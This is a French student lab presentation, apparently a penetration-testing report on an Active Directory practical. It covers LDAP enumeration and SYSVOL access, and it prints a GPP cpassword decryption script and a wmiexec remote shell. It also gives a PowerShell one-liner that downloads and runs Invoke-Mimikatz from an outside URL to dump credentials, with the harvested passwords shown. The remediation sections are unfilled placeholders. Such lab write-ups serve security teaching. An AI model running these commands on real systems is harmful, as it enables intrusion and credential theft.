[INCLUDE=presentation]
Title         : Sécurité des annuaires
Sub Title     : Travaux
Author        : Adrien GENNEVOIS - Erwan JAN
Affiliation   : ENSIBS
Reveal Theme  : sky
Beamer Theme  : singapore

[TITLE]

# Sommaire

[TOC]

#Contexte

Lors de ce TP nous avions à disposition 1 serveur LDAP ainsi que 1 ordinateur qui était dans le domaine active directory de ce serveur.  
  
La seule information que nous avions à notre disposition était les adresses IP des deux machines.  
  
Le but était de trouver les plus de failles possible, de les exploiter afin de récupérer le plus d'informations possibles puis de trouver le moyen de les patcher.

~ Begin Vertical
# Faille #1 : Enumeration LDAP

Disposant comme seul information des IP de deux machine dont celle du LDAP, la première chose à faire est d'explorer le contenue de cette annuaire.

Dans un AD il est possible d'effectuer des requêtes LDAP de façon anaonyme (sans s'authentifier en tant qu'utilisateur de l'AD).

Ainsi il est possible pour n'importe qui connaissant l'emplacement du LDAP d'effectuer des requêtes anonyme.

## Exploitation de la vulnérabilité 1 

De nombreux outils existent pour explorer un AD avec des requêtes LDAP. Nous avons utiliser Enum4Linux qui dresse un rapport sur tout ce qu'il a trouvé dans l'AD.

Enum4Linux nous a alors rapporté des informations importantes : 



## Patch de la vulnérabilité 1

Citrix

~ End Vertical

~ Begin Vertical

# Faille #2 : SMB 

Informations utilisées : bla bla bla

## Exploitation de la vulnérabilité 2
bla bla bla  

## Patch de la vulnérabilité 2
bla bla bla  

~ End Vertical

~ Begin Vertical

# Faille #3 : Politiques GPO accessibles

Informations : 

* Identifiants du compte testad (testad/testad)

## Exploitation de la vulnérabilité 3

~ Slide

On accède via le serveur smb au dossier sysvol contenant les GPO. Pour cela on utilise le compte que l'on a trouvé précèdement: testad/testad


``` javascript
~/Documents/enum4linux-0.8.9$ smbclient //192.168.1.234/SYSVOL -U GALACTIC/testad
WARNING: The "syslog" option is deprecated
Enter GALACTIC/testad's password: 
Domain=[GALACTIC] OS=[Windows Server 2012 R2 Standard Evaluation 9600]  
Server=[Windows Server 2012 R2 Standard Evaluation 6.3]
smb: \> ls
  .                                   D        0  Fri Mar  9 22:03:12 2018
  ..                                  D        0  Fri Mar  9 22:03:12 2018
  GALACTIC.LAN                        D        0  Fri Mar  9 22:03:12 2018

		7774207 blocks of size 4096. 5293702 blocks available
```


~
~ Slide 
Nous allons ensuite évoluer dans l'arborescence afin de trouver le fichier Group.xml qui contient les paramètres des GPO et notamment le mot de passe du compte administrateur.
``` javascript
\Policies\{62DB8100-2596-499B-AABF-55FE554CE724}\Machine\Preferences\Groups\> ls
  .                                   D        0  Sat Mar 10 22:07:49 2018
  ..                                  D        0  Sat Mar 10 22:07:49 2018
  Groups.xml                          A      560  Sat Mar 10 22:07:54 2018

		7774207 blocks of size 4096. 5293430 blocks available
```
On affiche ensuite le contenu du fichier Group.xml et on récupère le contenu du champ cpassword.
``` javascript
~/Documents$ cat Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"> 
<User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="Administrator (built-in)"  
image="2" changed="2018-03-10 21:07:54" uid="{9FC58681-90A0-4F1B-8599-76C968F68305}" 
userContext="0" removePolicy="0"> <Properties action="U" newName="" fullName=""  
description="" cpassword="O1Q+XKztTjZpWBhzHRjjhinmkA0yRMsqPEKLBvMc8ZA" changeLogon="0"  
noChange="1" neverExpires="0" acctDisabled="0" subAuthority="RID_ADMIN"   
userName="Administrator (built-in)"/> </User> </Groups>
```
~
~ Slide
Le cpassword que nous avons récupéré n'est actuellement pas lisible.En effet celui-ci est en chiffrer en AES et il va falloir le décrypter. Pour cela on récupère le script ruby de gpp-decrypt :
``` javascript
require 'rubygems'
require 'openssl'
require 'base64'
encrypted_data = "O1Q+XKztTjZpWBhzHRjjhinmkA0yRMsqPEKLBvMc8ZA"

def decrypt(encrypted_data)
  padding = "=" * (4 - (encrypted_data.length % 4))
  epassword = "#{encrypted_data}#{padding}"
  decoded = Base64.decode64(epassword)

  key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4$
  aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
  aes.decrypt
  aes.key = key
  plaintext = aes.update(decoded)
  plaintext << aes.final
  pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion

  return pass
end
blah = decrypt(encrypted_data)
puts blah
```
~
~ Slide
On execute ensuite le script afin d'obtenir le mot de passe du compte administrateur : SuPa_MDP_S1TH.
``` javascript
~/Documents/gpp-decrypt-master$ ruby gpp-decrypt.rb
SuPa_MDP_S1TH
```
Une fois en possessions des identifiants du compte administrateur, on peut accéder à un powershell sur la machine en exploitant le faille ??WMI?? grâce au script wmiexec.py

``` javascript
parallels@debian-gnu-linux-vm:~/Documents/impacket/examples$ python wmiexec.py "administrateur":"SuPa_MDP_S1TH"@"192.168.1.221"
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>
```

~

~ Slide
Une fois connecté à distance sur le poste, il est possible de lister tous les utilisateurs en se rendant dans C:\Users
``` javascript
C:\Users>dir
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/2.4/lib/standard-encodings.html
and then execute wmiexec.py again with -codec and the corresponding codec
 Le volume dans le lecteur C n'a pas de nom.
 Le num�ro de s�rie du volume est C658-91DA

 R�pertoire de C:\Users

11/03/2018  11:29    <DIR>          .
11/03/2018  11:29    <DIR>          ..
21/11/2016  08:46    <DIR>          Administrateur
26/03/2018  14:58    <DIR>          Administrateur.PC-VADOR
11/03/2018  00:23    <DIR>          d.sion
10/03/2018  23:42    <DIR>          d.traya
10/03/2018  23:48    <DIR>          d.vador
10/03/2018  23:08    <DIR>          defaultuser0
11/03/2018  00:51    <DIR>          hacker
11/03/2018  11:29    <DIR>          iis_admin
10/03/2018  23:37    <DIR>          padawan
21/11/2016  08:44    <DIR>          Public
```
On possède donc maintenant le nom de tous les utilisateurs du poste
~
## Patch de la vulnérabilité 3
bla bla bla  

~ End Vertical

~ Begin Vertical

# Faille #4 : Mots de passes et hashes des utilisateurs accessibles

Informations : 

* Accès au poste qui est dans le domaine du LDAP
* Identifiants du compte administrateur (administrateur/SuPa_MDP_S1TH)

## Exploitation de la vulnérabilité 4

~ Slide
Maintenant que nous possedons un powershell sur le poste, nous allons utiliser Mimikatz afin de récupérer les informations de connexion des utilisateurs du poste:
``` javascript
C:\Users\Public>powershell "IEX (New-Object Net.WebClient).DownloadString 
('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds"
```
~

~ Slide
Le résultat de la commande étant très long, voici le passage qui va nous permettre de récupérer de nouvelles informations:

``` javascript
	credman :	
	 [00000000]
	 * Username : GALACTIC\d.traya
	 * Domain   : d.traya
	 * Password : triumvirat
	 [00000001]
	 * Username : GALACTIC\d.traya
	 * Domain   : GALACTIC\d.traya
	 * Password : triumvirat
```
Mimikatz nous a donc permis de récupérer les identifiants de d.traya (d.traya/triumvirat)
~ 

## Patch de la vulnérabilité 4
bla bla bla

~ End Vertical